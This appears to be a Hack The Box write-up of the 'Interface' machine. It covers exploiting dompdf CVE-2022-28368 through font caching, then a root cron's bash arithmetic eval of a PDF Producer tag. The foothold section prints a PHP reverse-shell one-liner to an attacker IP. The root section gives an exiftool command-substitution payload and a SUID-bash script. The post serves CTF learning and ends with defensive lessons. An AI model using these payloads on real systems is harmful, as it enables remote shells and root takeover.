---
layout: post
title: "HTB: Interface"
subtitle: "dompdf font-cache RCE via a hidden API subdomain, then an exiftool Producer tag into a bash arithmetic eval cron"
date: 2023-04-22
tags: [htb, linux, dompdf, cve-2022-28368, exiftool]
category: writeups
tldr: "A CSP header leaked an internal API subdomain hosting an html2pdf endpoint backed by dompdf. CVE-2022-28368 abuses dompdf's font caching to write a PHP file into the web-accessible fonts directory, which gave a shell as www-data. A root cron ran bash arithmetic over a PDF Producer tag, so injecting a command substitution with exiftool got code execution as root via a SUID bash."
---

## the box

Interface is a medium Linux box. Port `22` ran OpenSSH 7.6p1 and port `80` ran nginx 1.14.0 serving a Next.js site stuck on a maintenance page. The front page had nothing to click, so the way in came from response headers, not the page itself.

## recon

Inspecting the responses, the Content-Security-Policy header referenced a subdomain that was not linked anywhere:

```
prd.m.rendering-api.interface.htb
```

I added it to my hosts file and fuzzed the API. The composer files and `/vendor/` paths showed this was a PHP app. Fuzzing `/api/` turned up an endpoint:

```
ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
  -mc all -fs 50
```

That found `html2pdf`. It expected JSON, so with `Content-Type: application/json` and a body of `{"html": "test"}` it rendered. The renderer was dompdf.

## foothold

dompdf is vulnerable to CVE-2022-28368. When dompdf parses CSS `@font-face` rules it downloads the referenced font and caches it on disk, and it writes that cache file with a `.php` extension into a predictable, web-accessible fonts directory. By pointing a font at a malicious file, you get a PHP file written under the web root that you can then request to execute. I used the positive-security dompdf-rce repo for this.

The cached payload landed at:

```
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/uwufont_normal_e6fb22f6f81884aea41ade16366c9153.php
```

The PHP it executed was a reverse shell:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.19/1337 0>&1'");?>
```

I injected the malicious CSS through the `html` JSON parameter, requested the cached font path, and caught a shell as www-data. That gave the user flag.

## user

The dompdf shell ran as www-data, which already had the user flag.

## root

linpeas flagged `/usr/local/sbin/cleancache.sh`. The script walks PDF files, reads each one's Producer metadata tag, and compares it against dompdf using a bash arithmetic test, `[[ "$x" -eq ... ]]`. The catch with bash arithmetic comparison is that it evaluates its operands as arithmetic expressions, and arithmetic context performs command substitution. So a Producer tag containing `$(...)` gets executed. This is the trick described in [vidarholen's blog post](https://www.vidarholen.net/contents/blog/?p=716): `-eq` behaves like `eval`.

I built a payload script that copies bash and sets it SUID:

```bash
mkdir a; cd a
cat > s << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/a/rr
chmod +s /tmp/a/rr
EOF
```

Then I injected a command substitution into the Producer tag of a file the cron would scan:

```bash
/usr/bin/exiftool -Producer='a[$(/tmp/a/s >&2)]+42' <file.jpg>
```

When root's cron processed the file, the arithmetic test ran `$(/tmp/a/s ...)` as root, which dropped a SUID copy of bash at `/tmp/a/rr`. Running it kept root privileges:

```bash
/tmp/a/rr -p
```

That gave a root shell and the root flag.

## takeaway

Two themes here. First, attack surface leaks through headers, the CSP value exposed an internal service that was never meant to be reachable. Second, bash arithmetic is not a safe place to put untrusted strings. `[[ $untrusted -eq N ]]` is an eval primitive, and feeding it attacker-controlled file metadata as root is the whole privesc.
